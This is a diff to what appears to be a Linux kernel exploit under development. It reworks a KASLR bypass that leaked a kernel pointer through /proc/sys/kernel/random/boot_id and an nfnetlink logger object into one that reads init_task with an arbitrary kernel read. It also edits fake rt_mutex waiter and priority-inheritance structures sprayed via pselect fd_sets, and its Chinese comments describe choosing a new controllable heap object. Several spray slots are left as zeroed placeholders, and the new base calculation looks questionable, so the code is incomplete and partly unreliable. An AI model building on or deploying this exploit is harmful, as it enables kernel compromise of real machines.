@@ -167,12 +167,14 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {4, 0, "pi_right"},
     {5, slide_oracle_target, "pi_left"},
 #else
-    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
+    // ===================== NOTE =====================
+    // 旧nfnetlink对象已移除，等待选定新可控堆结构体后恢复填充
+    {0, 0, "tree_pc_PLACEHOLDER"},
     {1, 0, "tree_right"},
     {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
-    {3, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi_pc"},
+    {3, 0, "pi_pc_PLACEHOLDER"},
     {4, 0, "pi_right"},
-    {5, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi_left"},
+    {5, 0, "pi_left_PLACEHOLDER"},
 #endif
 #if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
     {6, fake_task, "task"},
@@ -201,13 +203,15 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {6, 0, "pi1"},
     {7, slide_oracle_target, "pi2"},
 #else
-    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
+    // ===================== NOTE =====================
+    // 旧nfnetlink对象已移除，等待选定新可控堆结构体后恢复填充
+    {0, 0, "tree_pc_PLACEHOLDER"},
     {1, 0, "tree_right"},
     {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
     {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi0"},
+    {5, 0, "pi0_PLACEHOLDER"},
     {6, 0, "pi1"},
-    {7, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi2"},
+    {7, 0, "pi2_PLACEHOLDER"},
 #endif
     {8, FAKE_WAITER_PRIO, "pi_prio"},
     {9, 0, "pi_deadline"},
@@ -479,61 +483,24 @@ int hex_value(char c) {
   return -1;
 }
 
+// ===================== 重写：使用init_task获取基址，移除旧bootid+nfulnl逻辑 =====================
 uint64_t slide_read_stext(void) {
-  char buf[64];
-  unsigned char raw[16];
-  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
-  if (fd < 0) {
-    pr_warning("slide boot_id read denied errno=%d\n", errno);
+#if defined(SLIDE_INIT_TASK_IMAGE)
+  uint64_t init_task_ptr = kernel_read64(SLIDE_INIT_TASK_IMAGE);
+  if (!init_task_ptr || (init_task_ptr >> 48) != 0xffff) {
+    pr_warning("slide invalid init_task pointer=%016llx\n", (unsigned long long)init_task_ptr);
     return 0;
   }
-
-  ssize_t n = read(fd, buf, sizeof(buf) - 1);
-  int saved_errno = errno;
-  close(fd);
-  if (n < 0) {
-    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
-    return 0;
-  }
-  buf[n] = 0;
-
-  int nibble = -1;
-  int out = 0;
-  for (ssize_t i = 0; i < n && out < 16; i++) {
-    int v = hex_value(buf[i]);
-    if (v < 0) {
-      continue;
-    }
-    if (nibble < 0) {
-      nibble = v;
-      continue;
-    }
-    raw[out++] = (unsigned char)((nibble << 4) | v);
-    nibble = -1;
-  }
-  if (out != 16) {
-    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
-    return 0;
-  }
-
-  uint64_t leaked = 0;
-  for (int i = 0; i < 8; i++) {
-    leaked |= (uint64_t)raw[i] << (i * 8);
-  }
-  if ((leaked >> 48) != 0xffff) {
-    pr_warning("slide bad leaked pointer=%016llx\n",
-               (unsigned long long)leaked);
-    return 0;
-  }
-
-  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
-  uint64_t stext = leaked - off;
-  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
-             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
-  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
-             getpid(), (unsigned long long)stext);
+  uint64_t stext = init_task_ptr - SLIDE_INIT_TASK_IMAGE;
+  pr_success("slide leaked init_task_va=%016llx stext=%016llx\n",
+             (unsigned long long)init_task_ptr, (unsigned long long)stext);
   return stext;
+#else
+  pr_error("SLIDE_INIT_TASK_IMAGE macro not defined in target.h!\n");
+  return 0;
+#endif
 }
+
 uint64_t slide_child_leak_stext(void) {
   pthread_t waiter;
   pthread_t owner;
@@ -908,7 +875,7 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
     return 0;
   }
   if (strcmp(source, "pselect") == 0 && slide != slide_p0_offset) {
-    pr_warning("slide stale boot_id candidate=%08zx leaked_slide=%08llx\n",
+    pr_warning("slide stale candidate=%08zx leaked_slide=%08llx\n",
                slide_p0_offset, (unsigned long long)slide);
     return 0;
   }
@@ -1001,12 +968,8 @@ int slide_leak_kernel_base(void) {
       slide_p0_offset = 0;
 #endif
     }
-    pr_info("slide attempt %d/%d p0_offset=%08zx logger_parent=%016llx "
-            "bootid_target=%016llx\n",
-            attempt, max_attempts, slide_p0_offset,
-            (unsigned long long)(SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset),
-            (unsigned long long)(
-                SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset));
+    pr_info("slide attempt %d/%d p0_offset=%08zx\n",
+            attempt, max_attempts, slide_p0_offset);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_P0_OFFSET_CANDIDATES)
     if (!select_slide_payload_slot(slide_p0_offset)) {
